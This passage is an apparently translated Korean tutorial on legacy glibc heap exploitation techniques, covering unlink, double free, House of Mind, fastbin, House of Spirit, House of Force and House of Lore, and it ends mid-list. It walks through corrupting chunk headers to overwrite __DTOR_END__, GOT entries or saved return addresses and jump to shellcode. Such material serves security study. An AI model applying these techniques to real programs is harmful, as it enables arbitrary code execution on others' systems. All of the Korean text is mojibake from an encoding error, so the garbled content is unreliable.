ì¡°ê° aëŠ” bë¥¼ ë®ì–´ì“°ëŠ” ë° ì‚¬ìš©ë˜ë©°, sizeê°€ PREV\_INUSE ë¹„íŠ¸ë¥¼ ë¹„í™œì„±í™”í•˜ì—¬ ì¡°ê° aê°€ ììœ ë¡­ë‹¤ê³  ìƒê°í•˜ê²Œ í•©ë‹ˆë‹¤.

ë˜í•œ, bì˜ í—¤ë”ì—ì„œ sizeë¥¼ -4ë¡œ ë®ì–´ì”ë‹ˆë‹¤.

ê·¸ëŸ¼ í”„ë¡œê·¸ë¨ì€ â€œaâ€ê°€ ììœ ë¡­ê³  binì— ìˆë‹¤ê³  ìƒê°í•˜ì—¬ unlink()ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ PREV\_SIZE í—¤ë”ê°€ -4ì´ë¯€ë¡œ, â€œaâ€ì˜ ì¡°ê°ì´ ì‹¤ì œë¡œ b+4ì—ì„œ ì‹œì‘í•œë‹¤ê³  ìƒê°í•˜ê²Œ ë©ë‹ˆë‹¤. ì¦‰, b+4ì—ì„œ unlink()ë¥¼ ìˆ˜í–‰í•˜ê²Œ ë˜ë©°, b+12ì— fd í¬ì¸í„°ê°€ ìˆê³  b+16ì— bk í¬ì¸í„°ê°€ ìˆê²Œ ë©ë‹ˆë‹¤.

ì´ë ‡ê²Œ í•˜ë©´ bkì— shellcodeì˜ ì£¼ì†Œë¥¼ ë„£ê³  fdì— â€œputs()â€ì˜ ì£¼ì†Œ -12ë¥¼ ë„£ìœ¼ë©´ payloadê°€ ì™„ì„±ë©ë‹ˆë‹¤.

**í”„ë¡ íŠ¸ë§í¬ ê¸°ë²•**

í”„ë¡ íŠ¸ë§í¬ëŠ” ì–´ë–¤ ê²ƒì„ í•´ì œí•  ë•Œ ê·¸ ì¸ì ‘ ì¡°ê°ì´ ììœ ë¡­ì§€ ì•Šì„ ê²½ìš° í˜¸ì¶œë©ë‹ˆë‹¤. unlink()ë¥¼ í˜¸ì¶œí•˜ì§€ ì•Šê³  ì§ì ‘ frontlink()ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.

mallocì´ ê³µê²©ë°›ëŠ” ê²½ìš° ê²°ì½” í•´ì œë˜ì§€ ì•ŠëŠ” ê²½ìš° ìœ ìš©í•œ ì·¨ì•½ì ì…ë‹ˆë‹¤.

í•„ìš”í•œ ê²ƒ:

ì…ë ¥ ë°ì´í„° í•¨ìˆ˜ë¡œ ì˜¤ë²„í”Œë¡œìš°í•  ìˆ˜ ìˆëŠ” ë²„í¼

í•´ì œë˜ì–´ì•¼ í•  ì¸ì ‘ ë²„í¼, ì´ ë²„í¼ì˜ í—¤ë” fd í•„ë“œë¥¼ ì´ì „ ë²„í¼ì˜ ì˜¤ë²„í”Œë¡œìš°ë¡œ ìˆ˜ì •í•©ë‹ˆë‹¤.

í•´ì œí•  ë²„í¼ëŠ” 512ë³´ë‹¤ í¬ì§€ë§Œ ì´ì „ ë²„í¼ë³´ë‹¤ ì‘ì•„ì•¼ í•©ë‹ˆë‹¤.

3ë‹¨ê³„ ì´ì „ì— ì„ ì–¸ëœ ë²„í¼ê°€ prev\_sizeë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.

ì´ë ‡ê²Œ ë‘ ê°œì˜ mallocì—ì„œ ë¹„ì œì–´ì ìœ¼ë¡œ ë®ì–´ì“°ê³  í•˜ë‚˜ì—ì„œ ì œì–´ëœ ë°©ì‹ìœ¼ë¡œ í•´ì œí•˜ë©´ ìµìŠ¤í”Œë¡œì‡ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**double free() ì·¨ì•½ì **

ê°™ì€ í¬ì¸í„°ë¡œ free()ë¥¼ ë‘ ë²ˆ í˜¸ì¶œí•˜ë©´ ë‘ ê°œì˜ binì´ ê°™ì€ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ê²Œ ë©ë‹ˆë‹¤.

í•˜ë‚˜ë¥¼ ë‹¤ì‹œ ì‚¬ìš©í•˜ë ¤ê³  í•˜ë©´ ë¬¸ì œì—†ì´ í• ë‹¹ë©ë‹ˆë‹¤. ë‹¤ë¥¸ í•˜ë‚˜ë¥¼ ì‚¬ìš©í•˜ë ¤ê³  í•˜ë©´ ê°™ì€ ê³µê°„ì´ í• ë‹¹ë˜ë¯€ë¡œ, â€œfdâ€ì™€ â€œbkâ€ í¬ì¸í„°ê°€ ì´ì „ í• ë‹¹ì˜ ë°ì´í„°ë¡œ ì˜ëª» ì„¤ì •ë©ë‹ˆë‹¤.

**free() ì´í›„**

ì´ì „ì— í•´ì œëœ í¬ì¸í„°ê°€ ë‹¤ì‹œ ì œì–´ ì—†ì´ ì‚¬ìš©ë©ë‹ˆë‹¤.

## **8 í™ ì˜¤ë²„í”Œë¡œìš°: ê³ ê¸‰ ìµìŠ¤í”Œë¡œì‡**

unlink() ë° frontlink() ê¸°ë²•ì€ unlink() í•¨ìˆ˜ë¥¼ ìˆ˜ì •í•˜ì—¬ ì œê±°ë˜ì—ˆìŠµë‹ˆë‹¤.

**ë§ˆìŒì˜ ì§‘**

ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ê¸° ìœ„í•´ì„œëŠ” free() í˜¸ì¶œì´ í•˜ë‚˜ë§Œ í•„ìš”í•©ë‹ˆë‹¤. ì´ì „ì— í•´ì œëœ ì¡°ê°ì´ ë‹¤ìŒ ì¡°ê°ìœ¼ë¡œ ì‚¬ìš©ë  ìˆ˜ ìˆë„ë¡ ì°¾ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.

free() í˜¸ì¶œì€ public\_fREe(mem)ì„ í˜¸ì¶œí•˜ê²Œ ë˜ë©°, ì´ëŠ” ë‹¤ìŒì„ ìˆ˜í–‰í•©ë‹ˆë‹¤:

mstate ar\_ptr;

mchunkptr p;

â€¦

p = mem2chunk(mem); â€”> ì¡°ê°ì´ ì‹œì‘ë˜ëŠ” ì£¼ì†Œì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤ (mem-8)

â€¦

ar\_ptr = arena\_for\_chunk(p); â€”> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

â€¦

\_int\_free(ar\_ptr, mem);

}

\[1]ì—ì„œ size í•„ë“œì˜ NON\_MAIN\_ARENA ë¹„íŠ¸ë¥¼ í™•ì¸í•˜ë©°, ì´ ë¹„íŠ¸ë¥¼ ë³€ê²½í•˜ì—¬ í™•ì¸ì´ trueë¡œ ë°˜í™˜ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë©´ heap\_for\_ptr()ê°€ â€œmemâ€ì— ëŒ€í•´ AND ì—°ì‚°ì„ ìˆ˜í–‰í•˜ì—¬ 2.5 ë¹„íŠ¸ë¥¼ 0ìœ¼ë¡œ ë§Œë“­ë‹ˆë‹¤ (ìš°ë¦¬ì˜ ê²½ìš° 0x0804a000ì—ì„œ 0x08000000ìœ¼ë¡œ ë‚¨ìŠµë‹ˆë‹¤) ê·¸ë¦¬ê³  0x08000000->ar\_ptrì— ì ‘ê·¼í•©ë‹ˆë‹¤ (struct heap\_infoì²˜ëŸ¼).

ì´ë ‡ê²Œ í•˜ë©´ ì˜ˆë¥¼ ë“¤ì–´ 0x0804a000ì—ì„œ ì¡°ê°ì„ ì œì–´í•  ìˆ˜ ìˆê³ , **0x081002a0**ì—ì„œ ì¡°ê°ì´ í•´ì œë˜ë©´ 0x08100000 ì£¼ì†Œì— ì ‘ê·¼í•˜ì—¬ ì›í•˜ëŠ” ê²ƒì„ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ **0x0804a000**ì„ ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë‘ ë²ˆì§¸ ì¡°ê°ì´ í•´ì œë˜ë©´ heap\_for\_ptr(ptr)->ar\_ptrê°€ 0x08100000ì— ì“´ ê°’ì„ ë°˜í™˜í•©ë‹ˆë‹¤ (ì™œëƒí•˜ë©´ ì´ì „ì— ë³¸ ANDê°€ 0x081002a0ì— ì ìš©ë˜ë©°, ê·¸ë¡œë¶€í„° 4ë°”ì´íŠ¸ì˜ ê°’ì´ ì¶”ì¶œë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤).

ì´ë ‡ê²Œ í•˜ë©´ \_int\_free(ar\_ptr, mem) ì¦‰, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
â€¦\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

ì•ì„œ ë³¸ ê²ƒì²˜ëŸ¼ avì˜ ê°’ì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” ìš°ë¦¬ê°€ í•´ì œí•  ì¡°ê°ì— ì“´ ê²ƒì…ë‹ˆë‹¤.

unsorted\_chunksê°€ ì •ì˜ëœ ëŒ€ë¡œ, ìš°ë¦¬ëŠ” ë‹¤ìŒì„ ì•Œê³  ìˆìŠµë‹ˆë‹¤:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

ë”°ë¼ì„œ av->bins\[2]ì— \_\_DTOR\_END\_\_-12ì˜ ê°’ì„ ì“°ë©´ ë§ˆì§€ë§‰ ëª…ë ¹ì—ì„œ \_\_DTOR\_END\_\_ì— ë‘ ë²ˆì§¸ ì¡°ê°ì˜ ì£¼ì†Œê°€ ì“°ì—¬ì§‘ë‹ˆë‹¤.

ì¦‰, ì²« ë²ˆì§¸ ì¡°ê°ì˜ ì‹œì‘ ë¶€ë¶„ì— ì—¬ëŸ¬ ë²ˆ \_\_DTOR\_END\_\_-12ì˜ ì£¼ì†Œë¥¼ ë„£ì–´ì•¼ í•©ë‹ˆë‹¤. ì™œëƒí•˜ë©´ av->bins\[2]ê°€ ê·¸ ì£¼ì†Œë¥¼ ê°€ì ¸ê°€ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ë‘ ë²ˆì§¸ ì¡°ê°ì˜ ë§ˆì§€ë§‰ 5ê°œì˜ 0ì´ ìˆëŠ” ì£¼ì†Œì— ì²« ë²ˆì§¸ ì¡°ê°ì˜ ì£¼ì†Œë¥¼ ì¨ì•¼ heap\_for\_ptr()ê°€ ar\_ptrê°€ ì²« ë²ˆì§¸ ì¡°ê°ì˜ ì‹œì‘ ë¶€ë¶„ì— ìˆë‹¤ê³  ìƒê°í•˜ê²Œ í•˜ê³ , av->bins\[2]ë¥¼ ê·¸ê³³ì—ì„œ ê°€ì ¸ì˜¤ê²Œ ë©ë‹ˆë‹¤.

ë‘ ë²ˆì§¸ ì¡°ê°ì—ì„œ ì²« ë²ˆì§¸ ì¡°ê° ë•ë¶„ì— prev\_sizeë¥¼ 0x0cë¡œ ë®ì–´ì“°ê³  sizeë¥¼ NON\_MAIN\_ARENAë¥¼ í™œì„±í™”í•˜ëŠ” ê°’ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤.

ê·¸ ë‹¤ìŒ ë‘ ë²ˆì§¸ ì¡°ê°ì— nopsë¥¼ ë§ì´ ë„£ê³  ë§ˆì§€ë§‰ìœ¼ë¡œ shellcodeë¥¼ ë„£ìŠµë‹ˆë‹¤.

ì´ë ‡ê²Œ í•˜ë©´ \_int\_free(TROZO1, TROZO2)ê°€ í˜¸ì¶œë˜ê³ , prev\_sizeì˜ ì£¼ì†Œê°€ \_\_DTOR\_END\_\_ì— ì“°ì—¬ì ¸ shellcodeë¡œ ì í”„í•˜ê²Œ ë©ë‹ˆë‹¤.

ì´ ê¸°ìˆ ì„ ì ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ëª‡ ê°€ì§€ ì¶”ê°€ ìš”êµ¬ ì‚¬í•­ì´ ì¶©ì¡±ë˜ì–´ì•¼ í•˜ë©°, ì´ëŠ” í˜ì´ë¡œë“œë¥¼ ì¡°ê¸ˆ ë” ë³µì¡í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.

ì´ ê¸°ìˆ ì€ unlinkì— ëŒ€í•œ ê±°ì˜ ë™ì¼í•œ íŒ¨ì¹˜ê°€ ì ìš©ë˜ì—ˆê¸° ë•Œë¬¸ì— ë” ì´ìƒ ì ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤. ìƒˆë¡œ ê°€ë¦¬í‚¤ëŠ” ìœ„ì¹˜ê°€ ìì‹ ì„ ê°€ë¦¬í‚¤ê³  ìˆëŠ”ì§€ ë¹„êµí•©ë‹ˆë‹¤.

**Fastbin**

ì´ëŠ” ë§ˆìŒì˜ ì§‘ì˜ ë³€í˜•ì…ë‹ˆë‹¤.

ìš°ë¦¬ëŠ” ë‹¤ìŒ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ëŠ” \_int\_free() í•¨ìˆ˜ì˜ ì²« ë²ˆì§¸ í™•ì¸ì„ í†µê³¼í•œ í›„ì— ë„ë‹¬í•©ë‹ˆë‹¤.

fb = &(av->fastbins\[fastbin\_index(size)] â€”> fastbin\_index(sz) â€”> (sz >> 3) - 2

â€¦

p->fd = \*fb

\*fb = p

ì´ë ‡ê²Œ í•˜ë©´ â€œfbâ€ì— GOTì˜ í•¨ìˆ˜ ì£¼ì†Œê°€ ë“¤ì–´ê°€ê³ , ì´ ì£¼ì†Œì— ë®ì–´ì“´ ì¡°ê°ì˜ ì£¼ì†Œê°€ ë“¤ì–´ê°‘ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ì„œëŠ” arenaê°€ dtors ì£¼ì†Œ ê·¼ì²˜ì— ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ë” ì •í™•íˆëŠ” av->max\_fastê°€ ë®ì–´ì“¸ ì£¼ì†Œì— ìˆì–´ì•¼ í•©ë‹ˆë‹¤.

ë§ˆìŒì˜ ì§‘ì—ì„œ avì˜ ìœ„ì¹˜ë¥¼ ì œì–´í•  ìˆ˜ ìˆìŒì„ ì•Œì•˜ìŠµë‹ˆë‹¤.

ë”°ë¼ì„œ size í•„ë“œì— 8 + NON\_MAIN\_ARENA + PREV\_INUSEë¥¼ ë„£ìœ¼ë©´ fastbin\_index()ëŠ” fastbins\[-1]ì„ ë°˜í™˜í•˜ì—¬ av->max\_fastë¥¼ ê°€ë¦¬í‚µë‹ˆë‹¤.

ì´ ê²½ìš° av->max\_fastëŠ” ë®ì–´ì“¸ ì£¼ì†Œê°€ ë©ë‹ˆë‹¤ (ê°€ë¦¬í‚¤ëŠ” ê²ƒì´ ì•„ë‹ˆë¼, ê·¸ ìœ„ì¹˜ê°€ ë®ì–´ì”Œì›Œì§‘ë‹ˆë‹¤).

ë˜í•œ í•´ì œëœ ì¡°ê°ì˜ ì¸ì ‘ ì¡°ê°ì´ 8ë³´ë‹¤ ì»¤ì•¼ í•©ë‹ˆë‹¤ -> ìš°ë¦¬ê°€ í•´ì œëœ ì¡°ê°ì˜ sizeê°€ 8ì´ë¼ê³  í–ˆìœ¼ë¯€ë¡œ, ì´ ê°€ì§œ ì¡°ê°ì—ëŠ” 8ë³´ë‹¤ í° sizeë§Œ ë„£ìœ¼ë©´ ë©ë‹ˆë‹¤ (ë˜í•œ shellcodeê°€ í•´ì œëœ ì¡°ê°ì— ë“¤ì–´ê°€ë¯€ë¡œ, ì²˜ìŒì— nopsë¡œ ë–¨ì–´ì§€ëŠ” jmpë¥¼ ë„£ì–´ì•¼ í•©ë‹ˆë‹¤).

ë˜í•œ, ì´ ê°€ì§œ ì¡°ê°ì€ av->system\_memë³´ë‹¤ ì‘ì•„ì•¼ í•©ë‹ˆë‹¤. av->system\_memì€ 1848ë°”ì´íŠ¸ ë” ë©€ë¦¬ ìˆìŠµë‹ˆë‹¤.

\_\_DTOR\_END\_ì˜ nullë¡œ ì¸í•´ ë° GOTì˜ ì ì€ ì£¼ì†Œë¡œ ì¸í•´, ì´ëŸ¬í•œ ì„¹ì…˜ì˜ ì£¼ì†ŒëŠ” ë®ì–´ì“°ê¸°ì— ì í•©í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ, ìŠ¤íƒì„ ê³µê²©í•˜ê¸° ìœ„í•´ fastbinì„ ì ìš©í•˜ëŠ” ë°©ë²•ì„ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.

ë˜ ë‹¤ë¥¸ ê³µê²© ë°©ë²•ì€ **av**ë¥¼ ìŠ¤íƒìœ¼ë¡œ ë¦¬ë””ë ‰ì…˜í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

sizeë¥¼ 8 ëŒ€ì‹  16ìœ¼ë¡œ ìˆ˜ì •í•˜ë©´ fastbin\_index()ëŠ” fastbins\[0]ì„ ë°˜í™˜í•˜ê³ , ì´ë¥¼ ì‚¬ìš©í•˜ì—¬ ìŠ¤íƒì„ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ê²½ìš° canaryë‚˜ ìŠ¤íƒì— ì´ìƒí•œ ê°’ì´ ì—†ì–´ì•¼ í•˜ë©°, ì‹¤ì œë¡œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ìƒíƒœì—¬ì•¼ í•©ë‹ˆë‹¤: 4ë°”ì´íŠ¸ null + EBP + RET

4ë°”ì´íŠ¸ nullì€ **av**ê°€ ì´ ì£¼ì†Œì— ìˆì–´ì•¼ í•˜ë©°, **av**ì˜ ì²« ë²ˆì§¸ ìš”ì†ŒëŠ” 0ì´ì–´ì•¼ í•˜ëŠ” ë®¤í…ìŠ¤ì…ë‹ˆë‹¤.

**av->max\_fast**ëŠ” EBPê°€ ë˜ë©°, ì´ëŠ” ì œì•½ì„ ìš°íšŒí•˜ëŠ” ë° ìœ ìš©í•œ ê°’ì´ ë©ë‹ˆë‹¤.

**av->fastbins\[0]**ëŠ” **p**ì˜ ì£¼ì†Œë¡œ ë®ì–´ì“°ì—¬ì§€ë©°, RETê°€ ë˜ì–´ shellcodeë¡œ ì í”„í•˜ê²Œ ë©ë‹ˆë‹¤.

ë˜í•œ, **av->system\_mem** (ìŠ¤íƒ ìœ„ì¹˜ì—ì„œ 1484ë°”ì´íŠ¸ ìœ„)ì—ëŠ” ì œì•½ì„ ìš°íšŒí•  ìˆ˜ ìˆëŠ” ë§ì€ ì“°ë ˆê¸°ê°€ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ í•´ì œëœ ì¡°ê°ì˜ ì¸ì ‘ ì¡°ê°ì´ 8ë³´ë‹¤ ì»¤ì•¼ í•©ë‹ˆë‹¤ -> ìš°ë¦¬ê°€ í•´ì œëœ ì¡°ê°ì˜ sizeê°€ 16ì´ë¼ê³  í–ˆìœ¼ë¯€ë¡œ, ì´ ê°€ì§œ ì¡°ê°ì—ëŠ” 8ë³´ë‹¤ í° sizeë§Œ ë„£ìœ¼ë©´ ë©ë‹ˆë‹¤ (ë˜í•œ shellcodeê°€ í•´ì œëœ ì¡°ê°ì— ë“¤ì–´ê°€ë¯€ë¡œ, ì²˜ìŒì— nopsë¡œ ë–¨ì–´ì§€ëŠ” jmpë¥¼ ë„£ì–´ì•¼ í•©ë‹ˆë‹¤).

**ì •ì‹ ì˜ ì§‘**

ì´ ê²½ìš° ê³µê²©ìê°€ ë³€ê²½í•  ìˆ˜ ìˆëŠ” mallocì— ëŒ€í•œ í¬ì¸í„°ë¥¼ ì–»ëŠ” ê²ƒì´ ëª©í‘œì…ë‹ˆë‹¤ (ì˜ˆ: í¬ì¸í„°ê°€ ë³€ìˆ˜ì— ëŒ€í•œ ê°€ëŠ¥í•œ ì˜¤ë²„í”Œë¡œìš° ì•„ë˜ ìŠ¤íƒì— ìˆì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤).

ì´ë ‡ê²Œ í•˜ë©´ ì´ í¬ì¸í„°ê°€ ì›í•˜ëŠ” ê³³ì„ ê°€ë¦¬í‚¤ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ëª¨ë“  ìœ„ì¹˜ê°€ ìœ íš¨í•œ ê²ƒì€ ì•„ë‹ˆë©°, ê°€ì§œ ì¡°ê°ì˜ í¬ê¸°ëŠ” av->max\_fastë³´ë‹¤ ì‘ì•„ì•¼ í•˜ë©°, ë” êµ¬ì²´ì ìœ¼ë¡œëŠ” í–¥í›„ malloc() í˜¸ì¶œì—ì„œ ìš”ì²­ëœ í¬ê¸° + 8ê³¼ ê°™ì•„ì•¼ í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ ì·¨ì•½í•œ í¬ì¸í„° ë’¤ì— malloc(40)ì„ í˜¸ì¶œí•  ê²ƒì´ë¼ê³  ì•Œê³  ìˆë‹¤ë©´, ê°€ì§œ ì¡°ê°ì˜ í¬ê¸°ëŠ” 48ì´ì–´ì•¼ í•©ë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´ í”„ë¡œê·¸ë¨ì´ ì‚¬ìš©ìì—ê²Œ ìˆ«ìë¥¼ ìš”ì²­í•œë‹¤ë©´ 48ì„ ì…ë ¥í•˜ì—¬ ë³€ê²½ ê°€ëŠ¥í•œ malloc í¬ì¸í„°ë¥¼ ë‹¤ìŒ 4ë°”ì´íŠ¸(ìš´ ì¢‹ê²Œë„ EBPì— ì†í•  ìˆ˜ ìˆìŒ)ë¡œ ê°€ë¦¬í‚¤ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ 48ì´ ë’¤ì— ë‚¨ì•„ ë§ˆì¹˜ í—¤ë” sizeì²˜ëŸ¼ ë³´ì´ê²Œ ë©ë‹ˆë‹¤. ë˜í•œ ptr-4+48 ì£¼ì†ŒëŠ” ì—¬ëŸ¬ ì¡°ê±´ì„ ì¶©ì¡±í•´ì•¼ í•©ë‹ˆë‹¤ (ì´ ê²½ìš° ptr=EBP), ì¦‰, 8 < ptr-4+48 < av->system\_mem.

ì´ ì¡°ê±´ì´ ì¶©ì¡±ë˜ë©´, ë‹¤ìŒ malloc í˜¸ì¶œì´ malloc(40)ì¼ ë•Œ, EBP ì£¼ì†Œê°€ í• ë‹¹ë©ë‹ˆë‹¤. ê³µê²©ìê°€ ì´ mallocì— ì“°ëŠ” ê²ƒì„ ì œì–´í•  ìˆ˜ ìˆë‹¤ë©´ EBPì™€ EIPë¥¼ ì›í•˜ëŠ” ì£¼ì†Œë¡œ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ê²ƒì€ free()ê°€ ìŠ¤íƒì˜ EBP ì£¼ì†Œì— ìˆëŠ” ì¡°ê°ì´ ìƒˆë¡œ ìš”ì²­ëœ malloc()ì— ì í•©í•œ í¬ê¸°ë¥¼ ê°€ì§„ ì¡°ê°ìœ¼ë¡œ ê¸°ë¡ë˜ë„ë¡ í•˜ê¸° ìœ„í•´ ê·¸ë ‡ê²Œ í•  ê²ƒì…ë‹ˆë‹¤.

**í˜ì˜ ì§‘**

í•„ìš”í•œ ê²ƒ:

* wildernessë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆëŠ” ì¡°ê°ì— ëŒ€í•œ ì˜¤ë²„í”Œë¡œìš°
* ì‚¬ìš©ìê°€ ì •ì˜í•œ í¬ê¸°ë¡œ malloc() í˜¸ì¶œ
* ì‚¬ìš©ìê°€ ì •ì˜í•  ìˆ˜ ìˆëŠ” malloc() í˜¸ì¶œ

ë¨¼ì € wilderness ì¡°ê°ì˜ sizeë¥¼ ë§¤ìš° í° ê°’(0xffffffff)ìœ¼ë¡œ ë®ì–´ì”Œì›ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ ì¶©ë¶„íˆ í° ë©”ëª¨ë¦¬ ìš”ì²­ì€ \_int\_malloc()ì—ì„œ ì²˜ë¦¬ë˜ë©°, í™ì„ í™•ì¥í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.

ë‘ ë²ˆì§¸ë¡œ av->topì„ ê³µê²©ìê°€ ì œì–´í•  ìˆ˜ ìˆëŠ” ë©”ëª¨ë¦¬ ì˜ì—­(ì˜ˆ: ìŠ¤íƒ)ì„ ê°€ë¦¬í‚¤ë„ë¡ ë³€ê²½í•©ë‹ˆë‹¤. av->topì—ëŠ” \&EIP - 8ì´ ë“¤ì–´ê°‘ë‹ˆë‹¤.

ìš°ë¦¬ëŠ” av->topì„ ê³µê²©ìê°€ ì œì–´í•  ìˆ˜ ìˆëŠ” ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê°€ë¦¬í‚¤ë„ë¡ ë®ì–´ì¨ì•¼ í•©ë‹ˆë‹¤:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victimì€ í˜„ì¬ wilderness ì¡°ê°ì˜ ì£¼ì†Œ(í˜„ì¬ av->top)ì˜ ê°’ì„ ê°€ì ¸ì˜¤ê³ , remainderëŠ” ê·¸ ì£¼ì†Œì— malloc() ìš”ì²­ëœ ë°”ì´íŠ¸ ìˆ˜ë¥¼ ë”í•œ ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ \&EIP-8ì´ 0xbffff224ì— ìˆê³  av->topì´ 0x080c2788ì— ìˆë‹¤ë©´, ë‹¤ìŒ malloc()ì—ì„œ av->topì´ $EIP-8ì„ ê°€ë¦¬í‚¤ë„ë¡ í•˜ë ¤ë©´ mallocì—ì„œ ìš”ì²­í•´ì•¼ í•  í¬ê¸°ëŠ”:

0xbffff224 - 0x080c2788 = 3086207644.

ì´ë ‡ê²Œ í•˜ë©´ av->topì— ë³€ê²½ëœ ê°’ì´ ì €ì¥ë˜ê³ , ë‹¤ìŒ mallocì€ EIPë¥¼ ê°€ë¦¬í‚¤ê²Œ ë˜ì–´ ì´ë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì¤‘ìš”í•œ ê²ƒì€ ìƒˆ wilderness ì¡°ê°ì˜ sizeê°€ ë§ˆì§€ë§‰ malloc() ìš”ì²­ë³´ë‹¤ ì»¤ì•¼ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ì¦‰, wildernessê°€ \&EIP-8ì„ ê°€ë¦¬í‚¤ê³  ìˆë‹¤ë©´, sizeëŠ” ìŠ¤íƒì˜ EBP í•„ë“œì— ì •í™•íˆ ìœ„ì¹˜í•˜ê²Œ ë©ë‹ˆë‹¤.

**ì „ì„¤ì˜ ì§‘**

**SmallBin ì†ìƒ**

í•´ì œëœ ì¡°ê°ì€ í¬ê¸°ì— ë”°ë¼ binì— ì‚½ì…ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì‚½ì…ë˜ê¸° ì „ì— unsorted binsì— ì €ì¥ë©ë‹ˆë‹¤. ì¡°ê°ì´ í•´ì œë˜ë©´ ì¦‰ì‹œ binì— ë“¤ì–´ê°€ì§€ ì•Šê³  unsorted binsì— ë‚¨ì•„ ìˆìŠµë‹ˆë‹¤. ê·¸ í›„, ìƒˆ ì¡°ê°ì´ ì˜ˆì•½ë˜ê³  ì´ì „ì— í•´ì œëœ ì¡°ê°ì´ ìœ ìš©í•˜ë‹¤ë©´ ë°˜í™˜ë˜ì§€ë§Œ, ë” í° ì¡°ê°ì´ ì˜ˆì•½ë˜ë©´ unsorted binsì˜ í•´ì œëœ ì¡°ê°ì´ ì ì ˆí•œ binì— ë“¤ì–´ê°‘ë‹ˆë‹¤.

ì·¨ì•½í•œ ì½”ë“œë¥¼ ë„ë‹¬í•˜ê¸° ìœ„í•´ ë©”ëª¨ë¦¬ ìš”ì²­ì€ av->max\_fast(ë³´í†µ 72)ë³´ë‹¤ ì»¤ì•¼ í•˜ë©°, MIN\_LARGE\_SIZE(512)ë³´ë‹¤ ì‘ì•„ì•¼ í•©ë‹ˆë‹¤.

binì— ìš”ì²­ëœ í¬ê¸°ì— ì í•©í•œ ì¡°ê°ì´ ìˆë‹¤ë©´, ê·¸ ì¡°ê°ì´ í•´ì œëœ í›„ì— ë°˜í™˜ë©ë‹ˆë‹¤:

bck = victim->bk; ì´ì „ ì¡°ê°ì„ ê°€ë¦¬í‚¤ë©°, ìš°ë¦¬ê°€ ë³€ê²½í•  ìˆ˜ ìˆëŠ” ìœ ì¼í•œ ì •ë³´ì…ë‹ˆë‹¤.

bin->bk = bck; ì´ì „ ì¡°ê°ì´ ë§ˆì§€ë§‰ ì¡°ê°ì´ ë˜ë©°, bckê°€ ìŠ¤íƒì„ ê°€ë¦¬í‚¤ë©´ ë‹¤ìŒ ì˜ˆì•½ëœ ì¡°ê°ì— ì´ ì£¼ì†Œê°€ ì£¼ì–´ì§‘ë‹ˆë‹¤.

bck->fd = bin; ì´ ë¦¬ìŠ¤íŠ¸ë¥¼ ë‹«ì•„ binì„ ê°€ë¦¬í‚¤ê²Œ í•©ë‹ˆë‹¤.

í•„ìš”í•œ ê²ƒ:

